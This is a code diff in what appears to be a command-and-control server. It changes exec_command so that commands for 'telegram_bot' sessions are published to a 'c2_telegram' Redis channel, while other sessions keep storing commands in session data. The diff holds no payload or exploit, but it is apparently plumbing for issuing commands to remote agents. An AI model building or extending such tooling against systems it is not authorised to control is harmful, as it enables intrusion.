@@ -76,9 +76,13 @@ def exec_command(session_id, command):
         session_key = "session_details_" + session_id
         session_data = redis_client.get_data(session_key)
         payload = {"command": command, "command_date": dt}
-        session_data["commands"].append(payload)
-        logger_instance.info(f"exec_command - session_data: {session_data}")
-        redis_client.write_session_data(session_key, session_data)
+        if session_data["session_type"] == "telegram_bot":
+            print(f"telegram_bot, payload: {payload}")
+            redis_client.publish_message("c2_telegram", json.dumps(payload))
+        else:
+            session_data["commands"].append(payload)
+            logger_instance.info(f"exec_command - session_data: {session_data}")
+            redis_client.write_session_data(session_key, session_data)
         return "success"
     except Exception as e:
         logger_instance.info(f"exec_command - error: {e}")
